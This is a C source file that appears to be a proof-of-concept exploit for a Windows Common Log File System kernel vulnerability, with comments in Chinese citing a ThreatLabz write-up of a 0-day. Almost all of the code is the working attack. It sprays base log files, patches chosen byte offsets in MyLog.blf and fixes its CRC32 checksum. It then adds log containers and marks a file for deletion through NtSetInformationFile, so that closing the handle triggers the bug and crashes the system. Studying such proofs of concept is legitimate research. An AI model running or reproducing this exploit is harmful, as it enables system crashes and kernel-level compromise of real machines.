#pragma once
#include <Windows.h>
#include <stdio.h>
#include <psapi.h>
#include <tlhelp32.h>
#include<clfsw32.h>
#include"include.h"
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib,"clfsw32.lib")
#pragma message ("Test output")




DWORD CRC32(BYTE* ptr, DWORD Size)
{
	DWORD crcTable[256], crcTmp1;

	// 动态生成CRC-32表
	for (int i = 0; i < 256; i++)
	{
		crcTmp1 = i;
		for (int j = 8; j > 0; j--)
		{
			if (crcTmp1 & 1) crcTmp1 = (crcTmp1 >> 1) ^ 0xEDB88320L;
			else crcTmp1 >>= 1;
		}
		crcTable[i] = crcTmp1;
	}

	// 计算CRC32值
	DWORD crcTmp2 = 0xFFFFFFFF;
	while (Size--)
	{
		crcTmp2 = ((crcTmp2 >> 8) & 0x00FFFFFF) ^ crcTable[(crcTmp2 ^ (*ptr)) & 0xFF];
		ptr++;
	}
	return (crcTmp2 ^ 0xFFFFFFFF);
}



int main()
{
	//通过 CreateLogFile API 在文件夹 C：\Users\Public\ 中创建基本日志文件 MyLog.blf
	HANDLE logFile = CreateLogFile(L"LOG:C:\\Users\\Public\\MyLog", 0xC0000000, 1, 0, 4, 0);
	if (logFile == (HANDLE)-1)
	{
		DWORD error = GetLastError();
		printf("error=%d\n", error);
		return 1;

	}
	CloseHandle(logFile);


	/*
	创建数十个名为 MyLog_xxx.blf 的基本日志文件。
	使表示基本块的两个后续创建的内存区域之间的偏移量保持不变（其中常量偏移量等于 0x11000 字节）至关重要。
	最初的 0 天样品利用先进的方法来产生偏移常数。本博客系列的第 2 部分将介绍此技术。
	ThreatLabz PoC 使用常量计数来创建基本日志文件，因此可能不会使随后创建的内存区域之间的偏移量保持不变。
	因此，必须针对这种情况调整常量值。
	*/
	int num = 60;
	WCHAR* name;
	name = (WCHAR*)malloc(0x10000);
	for (int i = 0; i < num; i++)
	{
		HANDLE logFile1;
		do
		{
			memset(name, 0, 0x1000);
			unsigned int rnum = rand();
			wsprintfW(name, L"%s_%d", L"LOG:C:\\Users\\Public\\MyLog", rnum);
			logFile1 = CreateLogFile(name, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL);

		} while (logFile1 == (HANDLE)-1);
	}
	

	//omit some code of modifying some bytes for mylof.blf
	// 3. Modify some bytes for MyLog.blf
	// 0x868	|80 79 00 00| => |50 00 00 00|
	// 0x9A8	|58 13 00 00| => |30 1B 00 00|
	// 0x1B98	|F8 00 00 00| => |4B 11 01 00|
	// 0x2390	|00 00 00 00 00 00 00 00| => |B8 1B 00 00 30 1B 00 00|
	// 0x23A0	|00 00 00 00| => |07 F0 FD C1|
	// 0x23A4	|00 00 00 00 00 00 00 00| => |88 00 00 00 00 00 00 00|
	// 0x23AB	|00| => |01|
	// 0x2418	|00 00 00 00| => |20 00 00 00|
	DWORD NumberOfBytesRead;
	HANDLE v49 = CreateFileW(L"C:\\Users\\Public\\MyLog.blf", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	SetFilePointer(v49, 0x868, 0, FILE_BEGIN);
	ULONGLONG modify = 0;
	modify = 0x50;
	WriteFile(v49, &modify, 0x4, &NumberOfBytesRead, 0);

	SetFilePointer(v49, 0x9A8, 0, FILE_BEGIN);
	modify = 0x1B30;
	WriteFile(v49, &modify, 0x4, &NumberOfBytesRead, 0);

	SetFilePointer(v49, 0x1B98, 0, FILE_BEGIN);
	modify = 0x01114B;
	WriteFile(v49, &modify, 0x4, &NumberOfBytesRead, 0);

	SetFilePointer(v49, 0x2390, 0, FILE_BEGIN);
	modify = 0x1B3000001BB8;
	WriteFile(v49, &modify, 0x8, &NumberOfBytesRead, 0);

	SetFilePointer(v49, 0x23A0, 0, FILE_BEGIN);
	modify = 0xC1FDF007;
	WriteFile(v49, &modify, 0x4, &NumberOfBytesRead, 0);

	SetFilePointer(v49, 0x23A4, 0, FILE_BEGIN);
	modify = 0x88;
	WriteFile(v49, &modify, 0x8, &NumberOfBytesRead, 0);

	SetFilePointer(v49, 0x23AB, 0, FILE_BEGIN);
	modify = 0x1;
	WriteFile(v49, &modify, 0x1, &NumberOfBytesRead, 0);

	SetFilePointer(v49, 0x2418, 0, FILE_BEGIN);
	modify = 0x20;
	WriteFile(v49, &modify, 0x4, &NumberOfBytesRead, 0);
	CloseHandle(v49);
	
	
	
	
	//在 MyLog.blf 中的特定偏移量处修改几个字节，重新计算基本块的新 CRC32 校验和，然后在偏移量0x80C处写入新的校验和值。
	//然后，打开现有的基本日志文件 MyLog.blf。
	
	HANDLE v43 = CreateFileW(L"C:\\Users\\Public\\MyLog.blf", 0xC00000000, 7u, 0i64, 3u, 0x80u, 0i64);
	SetFilePointer(v43, 2048, 0i64, 1u);
	
	PBYTE baselog_buf = (PBYTE)malloc(0x7A00);
	ReadFile(v43, baselog_buf, 0x7A00u, &NumberOfBytesRead, 0i64);
	*(DWORD*)(baselog_buf + 0xC) = 0;// set CRC32 to zero
	unsigned int crc32 = CRC32(baselog_buf, 0x7A00);
	printf("crc32:0x%9x\n", crc32); 
	CloseHandle(v43);
	free(baselog_buf);

	HANDLE v50 = CreateFileW(L"C:\\Users\\Public\\MyLog.blf", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	SetFilePointer(v50, 2060, 0i64, 1u);
	WriteFile(v50, &crc32, 4u, &NumberOfBytesRead, 0i64);
	CloseHandle(v50);

	// 4. Call the CreateLogFile API to create a base log file MyLxg_xxx.blf
	HANDLE v51 = CreateLogFile(L"LOG:C:\\Users\\Public\\MyLog", GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL);
	if (v51 == (HANDLE)-1)
	{
		printf("open failed\n");
		printf("error: %d\n", GetLastError());
		exit(1);
	}
	printf("ok %x\n", v51);
	
	
	int v53 = rand();
	WCHAR* v25 = (WCHAR*)malloc(0x1000);
	WCHAR* v85 = v25;
	memset(v25, 0, 0x1000);
	//调用 CreateLogFile API 以在文件夹 C：\Users\Public\ 中创建基本日志文件 MyLxg_xxx.blf。
	wsprintfW(v85, L"%s_%d", L"LOG:C:\\Users\\Public\\MyLxg", v53);
	HANDLE v55=CreateLogFile(v85, 0xC0010000, 3u, 0i64, 4u, 0);
	if (v55 == (HANDLE)-1)
	{
		printf("choose name fail");
		exit(1);
	}

	
	ULONGLONG pcbContainer = 512;//The optional parameter that specifies the size of the container, in bytes.
	int v56 = rand();
	WCHAR pwszContainerPath[768] = { 0 };
	wsprintfW(pwszContainerPath, L"C:\\Users\\Public\\.container_1%d", v56);
	printf("LOG:C:\\Users\\Public\\MyLxg_xxx AddLogContainer before\n");
	//调用 AddLogContainer API 为在步骤 4 中创建的基本日志文件 MyLxg_xxx.blf 添加日志容器
	if (!AddLogContainer(v55, &pcbContainer, pwszContainerPath, 0i64))
	{
		CloseHandle(v55);
		CloseHandle(v51);
		printf("AddLogContainer fail ,please delete C:\\Users\\Public\\Mylxg_xxx.blf and try it again!\n");
		exit(1);
	}
	printf("LOG:C:\\Users\\Public\\MyLxg_xxx AddLogContainer after\n");

	
	
	HMODULE LibraryA = LoadLibraryA("ntdll.dll");
	typedef NTSTATUS(*_NtSetInformation)(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);
	_NtSetInformation fnNtSetInformationFile;
	//调用 GetProcAddress（LoadLibraryA（“ntdll.dll”）， “NtSetInformationFile”） 获取 NtSetInformationFile API 的函数地址。
	fnNtSetInformationFile = (NTSTATUS(_stdcall*)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS))GetProcAddress(LibraryA, "NtSetInformationFile");
	if (fnNtSetInformationFile)
	{
		pcbContainer = 512;
		printf("LOG:C:\\Users\\Public\\MyLog AddLogContainer before\n");
		//调用 AddLogContainer API 为在步骤 3 中打开的基本日志文件 MyLog.blf 添加日志容器。
		AddLogContainer(v51, &pcbContainer, pwszContainerPath, 0i64);
		printf("LOG:C:\\Users\\Public\\MyLog AddLogContainer after\n");

		char v33[16] = { 0 };
		char v28[4] = {};
		v28[0] = 1;


		printf("calling NtSetInformationFile\n");
		//调用 NtSetInformationFile（v55， （PIO_STATUS_BLOCK）v33， v28， 1， （FILE_INFORMATION_CLASS）13），其中最后一个参数是 FileInformationClass 的类型。
		//当值为 FileDispositionInformation （13） 时，该函数将在文件关闭时删除该文件，或者取消以前请求的删除。
		fnNtSetInformationFile(v55, (PIO_STATUS_BLOCK)v33, v28, 1i64, (FILE_INFORMATION_CLASS)13);

		printf("close handle for C:\\Users\\Public\\MyLxg_xxx\n");
		printf("BSOD\n");
		//调用 CloseHandle API 关闭基本日志文件 MyLxg_xxx.blf 的句柄，以触发此漏洞。
		CloseHandle(v55);
		printf("closeHandle for C:\\Users\\Public\\MyLog\n");
		CloseHandle(v51);
	}

	return 0;
}
